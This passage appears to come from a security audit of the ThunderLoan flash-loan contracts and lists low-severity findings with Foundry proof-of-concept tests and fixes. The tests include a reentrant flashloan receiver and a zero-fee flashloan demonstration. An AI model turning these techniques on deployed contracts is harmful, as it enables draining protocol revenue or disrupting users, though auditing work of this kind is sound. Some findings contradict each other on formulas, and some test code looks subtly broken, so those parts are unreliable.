        assertLt(vulnerableRate, correctRate, "fee was diluted");

        // LP1’s value is smaller with the vulnerable formula ----------------
        uint256 valueWithBug  = (lp1Shares * vulnerableRate) / PRECISION;
        uint256 valueCorrect  = (lp1Shares * correctRate) / PRECISION;
        assertLt(valueWithBug, valueCorrect, "LP1 lost value due to dilution");
    }
}

## Suggested Mitigation
Pass the previous totalSupply (before minting the new shares) to updateExchangeRate, or call updateExchangeRate before minting. This ensures the full fee is distributed only to existing shares: 

// in ThunderLoan.deposit()
uint256 oldSupply = assetToken.totalSupply();
assetToken.mint(msg.sender, sharesToMint);
assetToken.updateExchangeRate(fee, oldSupply);

and change updateExchangeRate to accept oldSupply and use it in the denominator.

## [L-8]. DOS issue in AssetToken::updateExchangeRate

## Description
The `updateExchangeRate` function in `AssetToken` reverts if the new exchange rate is not strictly greater than the old one. The check is `if (newExchangeRate <= s_exchangeRate) { revert AssetToken__ExhangeRateCanOnlyIncrease(...) }`. The fee for a deposit or flash loan is calculated in `ThunderLoan.getCalculatedFee`. Due to precision loss in this calculation, very small deposits can result in a calculated fee of zero. When `updateExchangeRate` is called with a fee of 0, `newExchangeRate` will be equal to `s_exchangeRate`, triggering the revert. This prevents users from depositing small amounts of certain assets, effectively a denial of service for those users.

## Impact
The protocol reverts when the calculated fee equals zero, preventing deposits whose fee rounds down to 0. This blocks very small-sized deposits (and therefore some potential LPs) but does not endanger existing funds nor affect larger deposits or withdrawals.

## Proof of Concept
1. Any user approves and tries to deposit an amount that produces a zero fee.
2. getCalculatedFee() returns 0 → ThunderLoan calls AssetToken.updateExchangeRate(0).
3. Because newExchangeRate == s_exchangeRate, the strict `>` check inside updateExchangeRate() reverts, making the whole deposit revert.

The following Foundry test reproduces the revert.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ThunderLoan}   from "src/protocol/ThunderLoan.sol";
import {AssetToken}    from "src/protocol/AssetToken.sol";
import {MockERC20}     from "@openzeppelin/contracts/token/ERC20/mocks/ERC20Mock.sol";
import {ITSwapPool}    from "src/interfaces/ITSwapPool.sol";
import {IPoolFactory}  from "src/interfaces/IPoolFactory.sol";

contract MockTSwapPool is ITSwapPool {
    uint256 internal _price;
    function setPrice(uint256 p) external { _price = p; }
    function getPriceOfOnePoolTokenInWeth() external view returns (uint256) { return _price; }
}

contract MockPoolFactory is IPoolFactory {
    mapping(address => address) private pools;
    function setPool(address token, address pool) external { pools[token] = pool; }
    function getPool(address token) external view returns (address) { return pools[token]; }
}

contract DosSmallDepositTest is Test {
    ThunderLoan      internal tl;
    MockERC20        internal usdc;
    MockTSwapPool    internal pool;
    MockPoolFactory  internal factory;
    address          user = makeAddr("user");

    function setUp() public {
        usdc = new MockERC20("USD Coin","USDC",6);
        pool = new MockTSwapPool();
        factory = new MockPoolFactory();
        factory.setPool(address(usdc), address(pool));
        pool.setPrice(1e18);              // 1 USDC == 1 WETH (simplifies fee calc)

        // Deploy ThunderLoan behind proxy
        ThunderLoan logic = new ThunderLoan();
        bytes memory initData = abi.encodeWithSelector(ThunderLoan.initialize.selector, address(factory));
        tl = ThunderLoan(address(new ERC1967Proxy(address(logic), initData)));

        tl.setAllowedToken(usdc, true);

        // Make an initial non-tiny deposit so an AssetToken exists
        usdc.mint(address(this), 1000e6);
        usdc.approve(address(tl), 1000e6);
        tl.deposit(usdc, 100e6);          // succeeds, initialises exchange rate

        // Give tiny amount to user
        usdc.mint(user, 1);
    }

    function test_RevertOnTinyDeposit() public {
        vm.startPrank(user);
        usdc.approve(address(tl), 1);
        bytes4 expected = bytes4(keccak256("AssetToken__ExhangeRateCanOnlyIncrease(uint256,uint256)"));
        vm.expectRevert(expected);
        tl.deposit(usdc, 1);              // reverts because fee == 0 → exchange rate unchanged
        vm.stopPrank();
    }
}


## Suggested Mitigation
Permit equal exchange rates instead of strictly increasing ones:

```solidity
function updateExchangeRate(uint256 fee) external onlyThunderLoan {
    uint256 ts = totalSupply();
    if (ts == 0) return; // nothing to update yet

    uint256 newRate = (s_exchangeRate * (ts + fee)) / ts;
    if (newRate < s_exchangeRate) {
        revert AssetToken__ExhangeRateCanOnlyIncrease(s_exchangeRate, newRate);
    }
    s_exchangeRate = newRate;
    emit ExchangeRateUpdated(newRate);
}
```

## [L-9]. Pausable Emergency Stop issue in ThunderLoanUpgraded::NA

## Description
The `ThunderLoanUpgraded` contract lacks a global emergency stop mechanism. While the owner can disable individual tokens via `setAllowedToken(token, false)`, there is no function to pause all protocol activity simultaneously. In the event of a critical vulnerability discovery, such as a flaw in the core logic or a widespread oracle failure, the inability to swiftly halt all operations exposes the protocol to significant risk. Attackers could exploit the delay as the owner sends separate transactions to disable each token one by one.

## Impact
Lack of a global pause limits the team’s ability to react quickly to undiscovered bugs or oracle failures. It is an operational risk, not a bug that directly lets an attacker steal or lock funds.

## Proof of Concept
1. A critical bug is discovered in the `redeem` function that allows any user to withdraw more assets than they are entitled to.
2. The protocol has multiple tokens enabled, such as WETH, DAI, and LINK.
3. The owner is notified and must act to prevent further losses.
4. The owner sends a transaction to disable the WETH token by calling `setAllowedToken(WETH, false)`.
5. An attacker, monitoring the mempool, sees the owner's transaction. The attacker front-runs the owner's subsequent transactions, executing the exploit on the DAI and LINK pools before they can be disabled.
6. A global `pause()` function would have allowed the owner to halt all `redeem` activity instantly with a single transaction, mitigating the losses.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ThunderLoanUpgraded} from "../src/upgradedProtocol/ThunderLoanUpgraded.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {MockERC20} from "./mocks/MockERC20.sol";

contract NoPauseTest is Test {
    ThunderLoanUpgraded internal thunderLoan;
    address internal owner = makeAddr("owner");
    address internal attacker = makeAddr("attacker");
    MockERC20 internal weth;
    MockERC20 internal dai;

    function setUp() public {
        ThunderLoanUpgraded logic = new ThunderLoanUpgraded();
        ERC1967Proxy proxy = new ERC1967Proxy(address(logic), abi.encodeWithSelector(ThunderLoanUpgraded.initialize.selector, address(0)));
        thunderLoan = ThunderLoanUpgraded(address(proxy));
        vm.prank(owner);
        thunderLoan.transferOwnership(owner);

        weth = new MockERC20("WETH", "WETH", 18);
        dai = new MockERC20("DAI", "DAI", 18);

        vm.startPrank(owner);
        thunderLoan.setAllowedToken(weth, true);
        thunderLoan.setAllowedToken(dai, true);
        vm.stopPrank();
    }

    // This test illustrates the scenario rather than a direct exploit.
    // A real exploit would depend on a separate vulnerability.
    function test_Scenario_NoGlobalPause() public {
        console.log("SCENARIO: A critical bug is found.");
        
        // Attacker prepares to exploit both WETH and DAI pools.
        console.log("Attacker sees owner's tx to disable WETH and frontruns to exploit DAI.");

        // Owner disables WETH pool.
        vm.prank(owner);
        thunderLoan.setAllowedToken(weth, false);
        console.log("Owner has disabled the WETH pool.");
        assertFalse(thunderLoan.isAllowedToken(weth));

        // In the same block, an attacker could have exploited the DAI pool.
        // We simulate this by asserting the DAI pool is still active.
        assertTrue(thunderLoan.isAllowedToken(dai), "DAI pool is still active and vulnerable.");
        console.log("Attacker exploits the still-active DAI pool.");

        // Owner's next transaction to disable DAI is too late.
        vm.prank(owner);
        thunderLoan.setAllowedToken(dai, false);
        console.log("Owner disables the DAI pool, but after it was exploited.");

        // A global pause() could have frozen both pools simultaneously in one transaction.
    }
}
```

## Suggested Mitigation
Implement a global pause mechanism by inheriting from OpenZeppelin's `PausableUpgradeable` contract. Add the `pauser` role (or use `onlyOwner`) to control `pause()` and `unpause()` functions. Critical functions such as `deposit`, `redeem`, and `flashloan` should then be protected with the `whenNotPaused` modifier.

```solidity
// In ThunderLoanUpgraded.sol
import "@openzeppelin/contracts-upgradeable/security/PausableUpgradeable.sol";

contract ThunderLoanUpgraded is ... PausableUpgradeable {
    function initialize(address tswapAddress) public initializer {
        // ...
        __Pausable_init();
    }

    function pause() external onlyOwner {
        _pause();
    }

    function unpause() external onlyOwner {
        _unpause();
    }

    function deposit(...) external whenNotPaused ... {
        // ...
    }

    function redeem(...) external whenNotPaused ... {
        // ...
    }

    function flashloan(...) external whenNotPaused ... {
        // ...
    }
}
```

## [L-10]. Integer Overflow/Math issue in ThunderLoanUpgraded::getCalculatedFee

## Description
The `getCalculatedFee` function calculates the final fee using two separate division operations. This can cause precision loss, especially for small loan amounts. If the intermediate `valueOfBorrowedToken` calculation results in a value that, when multiplied by `s_flashLoanFee`, is less than `FEE_PRECISION`, the final fee will be rounded down to zero. This allows for small, fee-free flashloans, leading to a loss of revenue for the protocol and its liquidity providers. The issue is acknowledged in the project's README.

## Impact
The protocol may fail to collect fees on small flashloans, resulting in a minor but continuous loss of revenue. Attackers could potentially exploit this by taking many small, free flashloans.

## Proof of Concept
1. Assume `FEE_PRECISION` is `1e18` and `s_flashLoanFee` is `3e15` (0.3%).
2. A user requests a flashloan for a very small `amount` of a token whose price in WETH is `1e18`.
3. Let the loan `amount` be 100 wei.
4. The first calculation is `valueOfBorrowedToken = (100 * 1e18) / 1e18 = 100`.
5. The second calculation is `fee = (100 * 3e15) / 1e18 = 3e17 / 1e18 = 0` due to integer division.
6. The user receives a flashloan without paying any fee.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ThunderLoanUpgraded} from "../src/upgradedProtocol/ThunderLoanUpgraded.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {MockPoolFactory} from "./mocks/MockPoolFactory.sol";
import {MockTSwapPool} from "./mocks/MockTSwapPool.sol";

contract PrecisionLossTest is Test {
    ThunderLoanUpgraded internal thunderLoan;
    address internal owner = address(this);
    MockERC20 internal token;

    function setUp() public {
        ThunderLoanUpgraded logic = new ThunderLoanUpgraded();
        MockPoolFactory factory = new MockPoolFactory();
        ERC1967Proxy proxy = new ERC1967Proxy(address(logic), abi.encodeWithSelector(ThunderLoanUpgraded.initialize.selector, address(factory)));
        thunderLoan = ThunderLoanUpgraded(address(proxy));
        
        token = new MockERC20("TKN", "TKN", 18);
        vm.prank(owner);
        thunderLoan.setAllowedToken(token, true);

        // Setup mock oracle to return price of 1e18
        MockTSwapPool pool = new MockTSwapPool();
        pool.setPrice(1e18);
        factory.setPool(address(token), address(pool));
    }

    function test_PrecisionLoss_ZeroFee() public {
        uint256 smallAmount = 100; // 100 wei
        uint256 fee = thunderLoan.getCalculatedFee(token, smallAmount);
        assertEq(fee, 0, "Fee for a small amount is incorrectly calculated as zero");

        uint256 s_flashLoanFee = 3e15; // 0.3%
        uint256 FEE_PRECISION = 1e18;
        uint256 expectedFee = (((smallAmount * 1e18) / FEE_PRECISION) * s_flashLoanFee) / FEE_PRECISION;
        assertEq(fee, expectedFee);
    }
}
```

## Suggested Mitigation
Replace the two-step division with a single call to Math.mulDiv, which performs 512-bit multiplication followed by division in one operation:

```
function getCalculatedFee(IERC20 token, uint256 amount) public view returns (uint256) {
    uint256 priceInWeth = getPriceInWeth(address(token));
    // fee = amount * priceInWeth * s_flashLoanFee / FEE_PRECISION / FEE_PRECISION
    return Math.mulDiv(amount, Math.mulDiv(priceInWeth, s_flashLoanFee, FEE_PRECISION), FEE_PRECISION);
}
```

Using `Math.mulDiv` (available since OZ Contracts v4.9) guarantees that:
1. No overflow can happen for any 256-bit inputs.
2. All precision is preserved because there is only a single rounding at the very end.

If OZ is not an option, implement a 512-bit `mulDiv` helper identical to the one used by Uniswap V3 and others.

## [L-11]. Reentrancy issue in ThunderLoanUpgraded::flashloan

## Description
The `flashloan` function does not implement a reentrancy guard. It changes state (`s_currentlyFlashLoaning[token] = true`), makes an external call to an untrusted receiver contract, and then changes state again after the call (`s_currentlyFlashLoaning[token] = false`). This violates the Checks-Effects-Interactions pattern. An attacker can re-enter the `flashloan` function from their receiver contract's `executeOperation` callback. This can lead to state corruption, as the inner call will complete and set `s_currentlyFlashLoaning` to `false` before the outer call has finished, breaking the logic of functions like `repay` which rely on this flag.

## Impact
An attacker can re-enter flashloan() and have the inner call clear the s_currentlyFlashLoaning flag before the outer loan finishes. This prevents the outer borrower from using the convenience repay() function (it will revert) and may confuse off-chain accounting that relies on the flag’s correctness. However, funds cannot be stolen because the final balance check inside flashloan() still enforces that the borrowed amount plus fee is returned to the AssetToken contract. The bug therefore results in a limited denial-of-service/integrity issue rather than direct financial loss.

## Proof of Concept
1. The attacker creates a contract (`AttackerContract`) that implements the `IFlashLoanReceiver` interface.
2. `AttackerContract` calls `ThunderLoanUpgraded.flashloan` for a given token (e.g., WETH).
3. `ThunderLoanUpgraded` sets `s_currentlyFlashLoaning[WETH] = true` and calls `executeOperation` on `AttackerContract`.
4. Inside `executeOperation`, the attacker checks `isCurrentlyFlashLoaning(WETH)`, which correctly returns `true`.
5. The attacker then re-enters `ThunderLoanUpgraded.flashloan` for the same token.
6. The inner `flashloan` call executes. Upon its completion (after its own `executeOperation` returns), it sets `s_currentlyFlashLoaning[WETH] = false`.
7. Control returns to the outer `executeOperation` call. The attacker now checks `isCurrentlyFlashLoaning(WETH)` again. It will return `false`, even though the initial flash loan is still in progress. This demonstrates the state corruption.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ThunderLoanUpgraded} from "../src/upgradedProtocol/ThunderLoanUpgraded.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {MockPoolFactory} from "./mocks/MockPoolFactory.sol";
import {IFlashLoanReceiver} from "../src/interfaces/IFlashLoanReceiver.sol";

contract ReentrancyTest is Test, IFlashLoanReceiver {
    ThunderLoanUpgraded internal thunderLoan;
    MockERC20 internal weth;
    MockPoolFactory internal poolFactory;

    bool reentered = false;
    bool stateCorrupted = false;

    function setUp() public {
        weth = new MockERC20("Wrapped Ether", "WETH", 18);
        poolFactory = new MockPoolFactory();
        thunderLoan = new ThunderLoanUpgraded();
        thunderLoan.initialize(address(poolFactory));

        thunderLoan.setAllowedToken(weth, true);
        weth.mint(address(this), 1000e18);
        weth.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(weth, 1000e18);
    }

    function testFlashloanReentrancy() public {
        // Attacker needs funds for the inner loan's fee
        weth.mint(address(this), 1e18);
        weth.approve(address(thunderLoan.getAssetFromToken(weth)), type(uint256).max);
        
        thunderLoan.flashloan(address(this), weth, 100e18, "");

        assertTrue(stateCorrupted, "State should have been corrupted by reentrancy");
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, // initiator
        bytes memory // params
    ) external returns (bool) {
        if (!reentered) {
            reentered = true;
            console.log("Outer call: isCurrentlyFlashLoaning before re-entrancy?", thunderLoan.isCurrentlyFlashLoaning(weth));
            // Re-enter flashloan
            thunderLoan.flashloan(address(this), MockERC20(token), amount / 2, "");
            console.log("Outer call: isCurrentlyFlashLoaning after re-entrancy?", thunderLoan.isCurrentlyFlashLoaning(weth));
            
            // Check for state corruption
            if (!thunderLoan.isCurrentlyFlashLoaning(weth)) {
                stateCorrupted = true;
            }
        }

        MockERC20(token).transfer(address(thunderLoan.getAssetFromToken(MockERC20(token))), amount + fee);
        return true;
    }
}
```

## Suggested Mitigation
Apply a reentrancy guard to the `flashloan` function. OpenZeppelin's `ReentrancyGuard` contract provides a `nonReentrant` modifier that is the standard and recommended way to prevent this class of attacks.

```solidity
// Import ReentrancyGuardUpgradeable
import "@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol";

// Inherit from ReentrancyGuardUpgradeable
contract ThunderLoanUpgraded is ... ReentrancyGuardUpgradeable {

    // In initialize function
    function initialize(address tswapAddress) public initializer {
        // ...
        __ReentrancyGuard_init();
        // ...
    }

    // Add nonReentrant modifier to the flashloan function
    function flashloan(
        address receiverAddress,
        IERC20 token,
        uint256 amount,
        bytes calldata params
    ) external revertIfNotAllowedToken(token) revertIfZero(amount) nonReentrant {
        // ... function body
    }
}
```

## [L-12]. DOS issue in AssetToken::updateExchangeRate

## Description
The `AssetToken.updateExchangeRate` function requires the new exchange rate to be strictly greater than the old one: `require(newExchangeRate > s_exchangeRate, ...)` (or `newExchangeRate <= s_exchangeRate` revert, which is equivalent). However, due to integer division in the calculation `newExchangeRate = (s_exchangeRate * (totalSupply() + fee)) / totalSupply()`, it's possible for `newExchangeRate` to equal `s_exchangeRate` if the `fee` is very small compared to `totalSupply`. When this happens, the `require` statement fails, causing the entire transaction to revert. This can prevent legitimate operations like `deposit` and `flashloan` from succeeding under certain conditions (e.g., small transaction amounts or a very large pool).

## Impact
The issue only prevents individual deposit/flash-loan transactions whose resulting fee is too small to change the exchange-rate after integer rounding. The protocol state and funds of other users remain safe; affected users can simply retry with a larger amount.

## Proof of Concept
1. A pool for DAI has a large `totalSupply` of asset tokens, e.g., `10^24`.
2. The `s_exchangeRate` is `10^18`.
3. A user attempts to take a flash loan that generates a very small `fee`, e.g., `fee = 100`.
4. `updateExchangeRate` calculates `newExchangeRate = (10^18 * (10^24 + 100)) / 10^24`.
5. Due to integer math, `(10^24 + 100) / 10^24` evaluates to `1`.
6. `newExchangeRate` is calculated as `10^18`, which is equal to `s_exchangeRate`.
7. The `require(newExchangeRate > s_exchangeRate, ...)` check fails, reverting the transaction.

## Proof of Code
// test/AssetTokenDos.t.sol
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/mocks/ERC20Mock.sol";
import {AssetToken} from "../src/protocol/AssetToken.sol";

contract AssetTokenDosTest is Test {
    AssetToken internal assetToken;
    ERC20Mock internal dai;

    function setUp() public {
        dai = new ERC20Mock("DAI", "DAI", address(this), 0);
        assetToken = new AssetToken(address(this), IERC20(address(dai)), "tDAI", "tDAI");
    }

    function testRevertsWhenFeeTooSmall() public {
        uint256 hugeSupply = 1e24; // simulate a large pool
        assetToken.mint(address(0x1), hugeSupply);

        vm.expectRevert(AssetToken.AssetToken__ExhangeRateCanOnlyIncrease.selector);
        assetToken.updateExchangeRate(100); // tiny fee => same exchange rate => revert
    }
}

## Suggested Mitigation
Do not revert when the fee is too small to affect the exchange-rate. Instead, simply return early so the rate never decreases but small operations still succeed:

function updateExchangeRate(uint256 fee) external onlyThunderLoan {
    uint256 supply = totalSupply();
    if (fee == 0 || supply == 0) return;
    uint256 newRate = (s_exchangeRate * (supply + fee)) / supply;
    if (newRate <= s_exchangeRate) return; // ignore insignificant fee
    s_exchangeRate = newRate;
    emit ExchangeRateUpdated(newRate);
}

## [L-13]. Integer Overflow/Math issue in ThunderLoan::deposit

## Description
The protocol's handling of ERC20 tokens with decimals other than 18 is non-standard and highly misleading, leading to situations where users can easily lose funds. The `AssetToken` is hardcoded to 18 decimals, but the `ThunderLoan.deposit` function mints a quantity of asset tokens numerically equal to the quantity of underlying tokens, without normalizing for decimal differences. For example, depositing 1,000 USDC (6 decimals) mints `1,000 * 10^6` `aUSDC` tokens. A standard wallet or UI would display this balance as `(1000 * 10^6) / 10^18 = 0.000000001` `aUSDC`, leading the user to believe their funds are lost. To redeem, the user must specify the raw, non-standard amount (`1000 * 10^6`), which is not discoverable through conventional tools, making fund recovery nearly impossible for a typical user and breaking composability with other protocols.

## Impact
Because AssetToken is hard-coded to 18 decimals, users dealing with 6-decimal tokens (e.g. USDC) will see very small numbers in standard wallets. This can confuse non-technical users and may lead them to believe funds are lost, but the tokens remain fully redeemable by calling `redeem()` with the raw balance or by pressing the wallet “max” button. No theft or permanent lock occurs; the problem is limited to poor UX and potential user error.

## Proof of Concept
1. Alice decides to deposit 1,000 USDC (which has 6 decimals) into the ThunderLoan contract.
2. She calls `deposit(usdcAddress, 1000 * 1e6)`.
3. The contract correctly takes her 1,000 USDC but mints `1000 * 1e6` `aUSDC` tokens to her address.
4. Since the `aUSDC` contract reports 18 decimals, her wallet displays her balance as `(1000 * 1e6) / 1e18 = 0.000000001` `aUSDC`.
5. Believing she has almost no tokens, she might try to redeem this small amount, getting back dust. To recover her funds, she would need to know the implementation detail of redeeming the raw value of `1000 * 1e6`, which is completely unintuitive and not displayed anywhere.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import "forge-std/Test.sol";
import {ThunderLoan} from "src/protocol/ThunderLoan.sol";
import {AssetToken} from "src/protocol/AssetToken.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {IPoolFactory} from "src/interfaces/IPoolFactory.sol";
import {ITSwapPool} from "src/interfaces/ITSwapPool.sol";

// Minimal 6-dec token
contract USDCMock is IERC20 {
    string public constant name = "Mock USDC";
    string public constant symbol = "USDC";
    uint8  public constant override decimals = 6;
    uint256 public totalSupply;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => uint256) public balanceOf;

    function transfer(address to,uint256 amt) external returns(bool){_transfer(msg.sender,to,amt);return true;}
    function transferFrom(address from,address to,uint256 amt) external returns(bool){uint256 a=allowance[from][msg.sender];require(a>=amt,"allow");allowance[from][msg.sender]=a-amt;_transfer(from,to,amt);return true;}
    function approve(address spender,uint256 amt) external returns(bool){allowance[msg.sender][spender]=amt;return true;}
    function mint(address to,uint256 amt) external {balanceOf[to]+=amt;totalSupply+=amt;}
    function _transfer(address f,address t,uint256 a) internal {require(balanceOf[f]>=a,"bal");balanceOf[f]-=a;balanceOf[t]+=a;}
}

contract DummyPoolFactory is IPoolFactory {
    address public immutable pool;
    constructor(address _p){pool=_p;}
    function getPool(address) external view returns(address){return pool;}
}

contract DummySwapPool is ITSwapPool {
    function getPriceOfOnePoolTokenInWeth() external pure returns(uint256){return 1e18;}
}

contract DecimalMismatchTest is Test {
    ThunderLoan tl;
    USDCMock usdc;
    AssetToken aUsdc;
    address alice = address(0xABCD);

    function setUp() public {
        usdc = new USDCMock();
        usdc.mint(alice, 1_000*1e6);

        DummySwapPool pool = new DummySwapPool();
        DummyPoolFactory pf = new DummyPoolFactory(address(pool));

        tl = new ThunderLoan();
        tl.initialize(address(pf));
        tl.setAllowedToken(IERC20(address(usdc)), true);
        aUsdc = tl.getAssetFromToken(IERC20(address(usdc)));
    }

    function testDecimalConfusion() public {
        uint256 dep = 1_000*1e6;
        vm.startPrank(alice);
        usdc.approve(address(tl), dep);
        tl.deposit(IERC20(address(usdc)), dep);
        vm.stopPrank();

        // Raw balance equals deposit, but UI will show tiny number
        assertEq(aUsdc.balanceOf(alice), dep);
        assertEq(aUsdc.decimals(), 18);
    }
}

## Suggested Mitigation
For better UX, make AssetToken report the same number of decimals as the underlying token (store `uint8 immutable i_decimals` in the constructor and override `decimals()`), or normalise deposits/redemptions to 18-decimals as suggested in the original write-up. This change is backwards-compatible and removes user confusion.

## [L-14]. Integer Overflow/Math issue in AssetToken::updateExchangeRate

## Description
The `updateExchangeRate` function in `AssetToken` updates the exchange rate based on fees collected from flash loans. The calculation `(fee * EXCHANGE_RATE_PRECISION) / totalSupply()` uses integer division, which can round down to zero if the `totalSupply` is significantly larger than the `fee * EXCHANGE_RATE_PRECISION`. When this happens, the fee paid by the flash loan borrower is effectively lost and does not accrue to liquidity providers, undermining the economic incentive of the protocol.

## Impact
Liquidity providers will not earn fees under certain conditions (e.g., small loan amounts relative to a large total liquidity pool), even though borrowers are paying them. This leads to a loss of yield for LPs and a broken incentive mechanism for the protocol.

## Proof of Concept
1. A large amount of liquidity is deposited, making `totalSupply()` very large (e.g., `10^28`).
2. A user takes a small flash loan, generating a tiny fee (e.g., `1000` wei).
3. `updateExchangeRate` is called.
4. The calculation `(1000 * 1e18) / 10^28` results in `10^21 / 10^28 = 0` due to integer division.
5. The `s_exchangeRate` is not updated, and the fee vanishes instead of accruing to LPs.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Test, console} from "forge-std/Test.sol";
import {AssetToken} from "src/protocol/AssetToken.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Minimal ThunderLoan mock for testing
contract ThunderLoanMock {
    function onlyThunderLoan() public pure {}
}

contract PrecisionLossTest is Test {
    AssetToken assetToken;
    address owner = address(this);
    address thunderLoanAddress;

    function setUp() public {
        // Mock ThunderLoan contract to satisfy `onlyThunderLoan` modifier
        thunderLoanAddress = address(new ThunderLoanMock());
        assetToken = new AssetToken(thunderLoanAddress, IERC20(address(0)), "Test Asset", "tAST");
    }

    function test_Low_FeeRoundingLoss() public {
        vm.startPrank(thunderLoanAddress);

        // Simulate a large total supply by minting to a dummy address
        uint256 largeTotalSupply = 10**28;
        assetToken.mint(address(0xdead), largeTotalSupply);
        assertEq(assetToken.totalSupply(), largeTotalSupply);

        uint256 initialExchangeRate = assetToken.getExchangeRate();

        // Simulate a small fee that will round to zero
        uint256 smallFee = 1000; // A fee smaller than totalSupply / 1e18
        
        // Update the exchange rate with the small fee
        assetToken.updateExchangeRate(smallFee);

        uint256 newExchangeRate = assetToken.getExchangeRate();

        // The exchange rate should not have changed because the increment rounded to 0
        assertEq(newExchangeRate, initialExchangeRate, "Exchange rate should not have changed");
    }
}
```

## Suggested Mitigation
To prevent fees from being lost due to rounding, the contract can accumulate fees in a separate variable and only apply them to the exchange rate calculation when the accumulated amount is large enough to make a difference. Alternatively, use a higher-precision math library for the calculation. A simpler, though less ideal, fix is to ensure the numerator is scaled appropriately before division or revert if the fee is too small to be registered.

## [L-15]. Unchecked Return issue in ThunderLoan::flashloan

## Description
The `flashloan` function in both `ThunderLoan` and `ThunderLoanUpgraded` makes an external call to `IFlashLoanReceiver.executeOperation`, which is defined to return a boolean value indicating success or failure. The contracts do not check this return value. If the receiver contract's operation fails and it returns `false` without reverting, the `ThunderLoan` contract will not detect the failure and will proceed as if the operation was successful. While the protocol is currently protected from direct fund loss by a subsequent balance check in the `repay` function, ignoring an explicit success/failure signal is a dangerous practice that violates the Checks-Effects-Interactions pattern and makes the contract brittle.

## Impact
Ignoring the boolean return value means the protocol treats a user-signalled failure as success. Today this only affects observability (a loan that the receiver flagged as failed will still be accounted as succeeded) but does not by itself allow loss of funds because the balance-based repayment guard remains. The issue therefore causes misleading accounting/monitoring and could hide logical errors, increasing maintenance risk for future upgrades.

## Proof of Concept
1. Liquidity provider deposits WETH.
2. Caller takes a flash-loan through a receiver that:
   a) receives the loaned tokens,
   b) immediately repays `amount + fee`,
   c) returns **false** from `executeOperation`.
3. Because ThunderLoan ignores the return value it continues and completes the flash-loan without reverting, even though the receiver explicitly reported a failure.
4. Event logs and external integrations will interpret the operation as successful although the receiver disagreed.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {ThunderLoan} from "src/protocol/ThunderLoan.sol";
import {IFlashLoanReceiver} from "src/interfaces/IFlashLoanReceiver.sol";
import {IPoolFactory} from "src/interfaces/IPoolFactory.sol";
import {ITSwapPool} from "src/interfaces/ITSwapPool.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockERC20 {
    string public name; string public symbol; uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;
    constructor(string memory _n, string memory _s){name=_n;symbol=_s;}
    function _mint(address to,uint256 amt) external {balanceOf[to]+=amt;totalSupply+=amt;}
    function transfer(address to,uint256 amt) external returns(bool){balanceOf[msg.sender]-=amt;balanceOf[to]+=amt;return true;}
    function transferFrom(address from,address to,uint256 amt) external returns(bool){allowance[from][msg.sender]-=amt;balanceOf[from]-=amt;balanceOf[to]+=amt;return true;}
    function approve(address sp,uint256 amt) external returns(bool){allowance[msg.sender][sp]=amt;return true;}
}
contract MockPool is ITSwapPool{function getPriceOfOnePoolTokenInWeth() external pure returns(uint256){return 1e18;}}
contract MockPoolFactory is IPoolFactory{mapping(address=>address)p;function getPool(address t) external view returns(address){return p[t];}function setPool(address t,address a) external{p[t]=a;}}

contract FalseReturningGoodRepayReceiver is IFlashLoanReceiver {
    function executeOperation(address token,uint256 amount,uint256 fee,address,bytes calldata) external returns (bool){
        IERC20(token).transfer(msg.sender, amount + fee); // repay
        return false; // signal failure
    }
}

contract UncheckedReturnSuccessTest is Test {
    ThunderLoan tl; MockERC20 weth; address depositor = address(0xBEEF);

    function setUp() public {
        tl = new ThunderLoan();
        weth = new MockERC20("WETH","WETH");
        MockPoolFactory pf = new MockPoolFactory();
        pf.setPool(address(weth), address(new MockPool()));
        tl.initialize(address(pf));
        tl.setAllowedToken(IERC20(address(weth)), true);
        weth._mint(depositor, 100 ether);
        vm.startPrank(depositor);
        weth.approve(address(tl), 100 ether);
        tl.deposit(IERC20(address(weth)), 100 ether);
        vm.stopPrank();
    }

    function testLoanSucceedsEvenWhenReceiverReturnsFalse() public {
        FalseReturningGoodRepayReceiver recv = new FalseReturningGoodRepayReceiver();
        tl.flashloan(address(recv), IERC20(address(weth)), 10 ether, "");
        // test passes if no revert – proving the false return was ignored
    }
}

## Suggested Mitigation
The boolean return value from the `executeOperation` call must be checked. If it is `false`, the transaction should be reverted immediately with a descriptive error message.

```solidity
// In ThunderLoan.sol and ThunderLoanUpgraded.sol

// Add a new error
error FlashloanCallbackFailed();

function flashloan(...) external {
    // ... (checks and fee calculation)
    SafeERC20.safeTransfer(token, receiver, amount);
    
    bool success = IFlashLoanReceiver(receiver).executeOperation(
        token, 
        amount, 
        fee, 
        msg.sender, 
        params
    );

    if (!success) {
        revert FlashloanCallbackFailed();
    }

    repay(token, amount + fee);
    // ...
}
```

